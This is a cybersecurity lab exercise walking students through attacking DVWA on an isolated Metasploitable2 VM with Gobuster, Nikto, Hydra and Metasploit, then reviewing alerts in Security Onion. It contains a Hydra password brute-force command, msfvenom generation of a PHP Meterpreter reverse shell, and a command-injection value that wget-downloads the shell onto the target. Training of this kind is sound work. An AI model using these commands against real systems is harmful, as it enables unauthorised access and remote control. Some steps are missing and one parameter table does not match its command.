# Activity: Comprehensive DVWA Penetration Testing with Security Onion Analysis

## Overview

In this activity, you will perform a complete web application penetration test against DVWA (Damn Vulnerable Web Application) running on your Metasploitable2 VM. You will use six professional Kali Linux tools in a structured, hierarchical approach: Gobuster, Nikto, OWASP ZAP, SQLmap, Metasploit, and Hydra. After each testing phase, you will switch to Security Onion to analyze the network traffic and alerts generated by your attacks. This dual perspective teaches both offensive exploitation and defensive detection.

Prerequisites: You have successfully completed the installation guide (Steps 1-12) AND the MSFconsole exploitation activity. Your VMs are configured, running, and communicating: Kali at `10.10.1.10`, Metasploitable2 at `10.10.1.20`, Security Onion monitoring the `intnet` network.

Estimated time: 3-4 hours (can be split across multiple sessions)

Difficulty progression: This activity is designed hierarchically - each phase builds on knowledge from previous phases and increases in complexity.

### Step 1.1 - Directory Fuzzing with Gobuster

Goal: Discover all accessible directories and files in DVWA that may not be linked from the main page.

#### Step 1.1.1 - Basic Gobuster Scan

In Kali terminal:

```bash
cd ~/dvwa-pentest/scans

gobuster dir -u http://10.10.1.20/dvwa/ \
-w /usr/share/wordlists/dirb/common.txt \
-t 50 \
-o gobuster_dvwa_scan.txt
```

Parameter explanation:

| Parameter | Meaning |
| --- | --- |
| `dir` | Directory/file enumeration mode |
| `-u` | Target URL |
| `-w` | Wordlist path (`common.txt` contains ~4,600 common names) |
| `-t 50` | 50 concurrent threads (faster scan) |
| `-o` | Output file to save results |

Expected output (partial):

```text

/.htaccess            (Status: 403)
/.htpasswd            (Status: 403)
/CHANGELOG.md         (Status: 200)
/README.md            (Status: 200)
/config               (Status: 301)
/css                  (Status: 301)
/dvwa                 (Status: 200)
/external             (Status: 301)
/images               (Status: 301)
/includes             (Status: 301)
/index.php            (Status: 200)
/js                   (Status: 301)
/login.php            (Status: 200)
/logout.php           (Status: 302)
/phpinfo.php          (Status: 200)
/robots.txt           (Status: 200)
/security.php         (Status: 200)
/setup.php            (Status: 200)
/vulnerabilities      (Status: 301)
```

Take a screenshot of this output showing at least 15 discovered directories.

#### Step 1.1.2 - Understanding HTTP Status Codes

| Code | Meaning | Security Implication |
| --- | --- | --- |
| `200` | OK - File exists | Direct access possible |
| `301` | Moved Permanently (redirect) | Directory exists |
| `302` | Found (temporary redirect) | Often login redirection |
| `403` | Forbidden | Directory/file exists but access restricted |
| `404` | Not Found | Does NOT exist (ignore) |

### Step 1.2 - Web Server Vulnerability Scanning with Nikto

Goal: Automatically identify known vulnerabilities, misconfigurations, and sensitive information in the web server.

#### Step 1.2.1 - Basic Nikto Scan

In Kali terminal:

```bash
cd ~/dvwa-pentest/scans

nikto -h http://10.10.1.20/dvwa/ \
-Format html \
-o nikto_dvwa_scan.html \
-Tuning 123456789
```

Parameter explanation:

| Parameter | Meaning |
| --- | --- |
| `-h` | Target host |
| `-ssl` | Force SSL mode (even though not using HTTPS - tests for HTTPS misconfigurations) |
| `-Format html` | Output as HTML (also supports txt, csv, xml) |
| `-o` | Output filename |
| `-Tuning` | Test categories (`123456789` = all tests) |

Expected findings (copy these to your evidence file):

Nikto will report findings like:

- `/dvwa/phpinfo.php`: PHP is installed, and `phpinfo()` is accessible
- `/dvwa/config/`: Directory indexing is enabled
- `/dvwa/vulnerabilities/`: Directory indexing found
- Retrieved `x-powered-by` header: `PHP/5.3.10-1ubuntu3.46`
- `Apache/2.2.22` appears to be outdated (current is at least `2.4.x`)
- `/dvwa/robots.txt` contains 1 entry
- Cookie `PHPSESSID` created without `httponly` flag

#### Step 1.2.2 - Read Nikto Findings

```bash
firefox ./nikto_dvwa_scan.html.htm
```

#### Step 1.2.3 - Interpret Nikto Findings

Create a report in `~/dvwa-pentest/evidence/nikto_vulnerabilities.txt`:

```text

## Scan Date: [Insert current date]
```

### Step 4.2 - Single Username Brute Force with Hydra

#### Step 4.2.1 - Create a Password Wordlist

In Kali terminal:

```bash
cd ~/dvwa-pentest/exploits

# Create a small test wordlist
cat > test_passwords.txt << EOF
admin
password
123456
letmein
abc123
test
root
toor
password123
admin123
EOF
```

#### Step 4.2.2 - Run Hydra Basic Attack

In Kali terminal:

```bash
hydra -l admin \
-P test_passwords.txt \
10.10.1.20 \
http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect" \
-t 4 \
-V
```

Parameter explanation:

| Parameter | Meaning |
| --- | --- |
| `-l admin` | Single username (`admin`) |
| `-P` | Password wordlist path |
| `10.10.1.20` | Target IP |
| `http-post-form` | Service and module |
| `"/dvwa/...:incorrect"` | URL, POST data (`^USER^`, `^PASS^` are placeholders), failed condition string |
| `-t 4` | 4 threads (parallel attempts) |
| `-V` | Verbose (show each attempt) |

Expected output:

```text
[80][http-post-form] host: 10.10.1.20   login: admin   password: password
```

Success: Hydra found the password `password` for username `admin`.

#### Step 4.2.3 - Save Hydra Results

### Step 5.3 - Metasploit Reverse Shell (Advanced)

#### Step 5.3.1 - Generate a PHP Reverse Shell Payload

In Kali terminal:

```bash
cd ~/dvwa-pentest/exploits

msfvenom -p php/meterpreter_reverse_tcp \
LHOST=10.10.1.10 \
LPORT=5555 \
-f raw \
-o reverse_shell.php
```

Parameter explanation:

| Parameter | Meaning |
| --- | --- |
| `-p` | Payload type (Meterpreter reverse TCP) |
| `LHOST` | Your Kali IP (where shell connects back) |
| `LPORT` | Port to listen on |
| `-f raw` | Output format (raw PHP code) |
| `-o` | Output file |

#### Step 5.3.2 - Encode the Payload for URL Injection

First, serve the payload from Kali:

In Kali (Terminal 2):

```text
127.0.0.1; wget http://10.10.1.10:8000/reverse_shell.php -O /tmp/shell.php
```

